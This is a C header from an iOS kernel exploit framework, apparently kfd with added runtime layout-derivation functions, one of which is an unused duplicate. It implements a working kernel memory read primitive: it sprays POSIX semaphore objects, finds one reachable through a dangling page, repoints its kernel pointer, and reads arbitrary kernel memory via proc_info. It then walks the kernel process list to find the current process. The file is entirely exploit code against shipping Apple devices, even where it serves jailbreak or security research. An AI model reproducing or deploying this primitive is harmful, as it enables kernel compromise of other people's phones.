/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kread_sem_open_h
#define kread_sem_open_h

extern u64 gKeKfdKernelProc;

const char* kread_sem_open_name = "kfd-posix-semaphore";

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(i32))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    sem_unlink(kread_sem_open_name);
    i32 sem_fd = (i32)(usize)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = sem_fd;
    u64 buffer = (u64)(sem_data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, u64 id)
{
    i32 fd = (i32)(usize)(sem_open(kread_sem_open_name, 0, 0, 0));
    assert(fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(object_uaddr);
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    if ((pnode[0].pinfo > PAC_MASK) &&
        (pnode[1].pinfo == pnode[0].pinfo) &&
        (pnode[2].pinfo == pnode[0].pinfo) &&
        (pnode[3].pinfo == pnode[0].pinfo) &&
        (pnode[0].padding == 0) &&
        (pnode[1].padding == 0) &&
        (pnode[2].padding == 0) &&
        (pnode[3].padding == 0)) {
        for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            i32 callnum = PROC_INFO_CALL_PIDFDINFO;
            i32 pid = kfd->info.env.pid;
            u32 flavor = PROC_PIDFDPSEMINFO;
            u64 arg = fds[object_id];
            u64 buffer = (u64)(&data);
            i32 buffersize = (i32)(sizeof(struct psem_fdinfo));

            const u64 shift_amount = 4;
            pnode[0].pinfo += shift_amount;
            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
            pnode[0].pinfo -= shift_amount;

            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }

        /*
         * False alarm: it wasn't one of our psemmode objects.
         */
        print_warning("failed to find modified psem_name sentinel");
    }

    return false;
}

void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_sem_open_kread_u64);
}

static void ke_sem_derive_proc_layout(struct kfd* kfd, u64 task_kaddr)
{
    // Serotonin-style runtime derivation (no kernelcache, no patchfinder):
    // the semaphore owner is kernel_task, and struct proc either embeds the
    // task at +0x10 (iOS 15/17: xnu-8019/xnu-10002) or is allocated right
    // before it in the same zone (iOS 16: task = proc + object_size).
    u64 objectSize = 0;
    u64 pidOff = 0x68;

    for (u64 d = 0x300; d <= 0x1000; d += 8) {
        u64 v = 0;
        u64 cand = task_kaddr - d;
        kread((u64)kfd, cand + 0x10, &v, sizeof(v));
        if (v == task_kaddr) {
            objectSize = d;
            break;
        }
    }

    if (objectSize == 0) {
        pidOff = 0x60;
        for (u64 d = 0x300; d <= 0x1000; d += 8) {
            u64 cand = task_kaddr - d;
            u32 pid = 0xFFFFFFFF;
            kread((u64)kfd, cand + 0x60, &pid, sizeof(pid));
            if (pid != 0) {
                continue;
            }
            u64 prev = 0;
            kread((u64)kfd, cand + 0x8, &prev, sizeof(prev));
            if ((prev & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
                objectSize = d;
                break;
            }
        }
    }

    dynamic_system_info.proc__object_size = objectSize;
    dynamic_system_info.proc__p_pid = pidOff;
    dynamic_system_info.proc__p_list__le_next = 0x0;
    dynamic_system_info.proc__p_list__le_prev = 0x8;
    dynamic_system_info.proc__p_fd__fd_ofiles = 0xf8;
    dynamic_system_info.proc__task = (pidOff == 0x68) ? 0x10 : 0x0;
    dynamic_system_info.task__map = 0x28;
}

// Runtime derivation of the struct proc layout, Serotonin-style:
// the semaphore owner is kernel_task (task of proc0). Scan backwards to find
// the proc allocation and derive object_size / pid offset / task placement —
// no offsets table, no kernelcache, no patchfinder needed.
static void ke_kfd_derive_proc_layout(struct kfd* kfd, u64 task_kaddr)
{
    // 15.x / 17.x: struct proc embeds the task at +0x10.
    for (u64 d = 0x300; d <= 0x1000; d += 8) {
        u64 v = 0;
        u64 cand = task_kaddr - d;
        kread((u64)kfd, cand + 0x10, &v, sizeof(v));
        if (v == task_kaddr) {
            dynamic_system_info.proc__object_size = d;
            dynamic_system_info.proc__p_pid = 0x68;
            dynamic_system_info.proc__p_list__le_next = 0x0;
            dynamic_system_info.proc__p_list__le_prev = 0x8;
            dynamic_system_info.proc__p_fd__fd_ofiles = 0xf8;
            dynamic_system_info.proc__task = 0x10;
            dynamic_system_info.task__map = 0x28;
            gKeKfdKernelProc = cand;
            return;
        }
    }

    // 16.x: task no longer embedded; allocated right after the proc object.
    // proc0 has pid==0 and a valid (signed) p_list.le_prev.
    for (u64 d = 0x300; d <= 0x1000; d += 8) {
        u64 cand = task_kaddr - d;
        u32 pid60 = 0xFFFFFFFF;
        kread((u64)kfd, cand + 0x60, &pid60, sizeof(pid60));
        if (pid60 != 0) continue;
        u64 prev = 0;
        kread((u64)kfd, cand + 0x8, &prev, sizeof(prev));
        if ((prev & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
            dynamic_system_info.proc__object_size = d;
            dynamic_system_info.proc__p_pid = 0x60;
            dynamic_system_info.proc__p_list__le_next = 0x0;
            dynamic_system_info.proc__p_list__le_prev = 0x8;
            dynamic_system_info.proc__p_fd__fd_ofiles = 0xf8;
            dynamic_system_info.proc__task = 0x0;
            dynamic_system_info.task__map = 0x28;
            gKeKfdKernelProc = cand;
            return;
        }
    }
}

void kread_sem_open_find_proc(struct kfd* kfd)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 pseminfo_kaddr = pnode->pinfo;
    u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
    u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
    ke_kfd_derive_proc_layout(kfd, task_kaddr);
    u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
    kfd->info.kaddr.kernel_proc = proc_kaddr;

    /*
     * Go backwards from the kernel_proc, which is the last proc in the list.
     */
    while (true) {
        i32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
            break;
        }

        proc_kaddr = dynamic_kget(proc__p_list__le_prev, proc_kaddr);
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, u64 id)
{
    /*
     * Let kwrite_sem_open_deallocate() take care of
     * deallocating all the shared file descriptors.
     */
    return;
}

void kread_sem_open_free(struct kfd* kfd)
{
    /*
     * Let's null out the kread reference to the shared data buffer
     * because kwrite_sem_open_free() needs it and will free it.
     */
    kfd->kread.krkw_method_data = NULL;
}

/*
 * 64-bit kread function.
 */

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 old_pinfo = pnode->pinfo;
    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_uid);
    pnode->pinfo = new_pinfo;

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    pnode->pinfo = old_pinfo;
    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
}

/*
 * 32-bit kread function that is guaranteed to not underflow a page,
 * i.e. those 4 bytes are the first 4 bytes read by the modified kernel pointer.
 */

u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 old_pinfo = pnode->pinfo;
    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_usecount);
    pnode->pinfo = new_pinfo;

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    pnode->pinfo = old_pinfo;
    return *(u32*)(&data.pseminfo.psem_stat.vst_size);
}

#endif /* kread_sem_open_h */
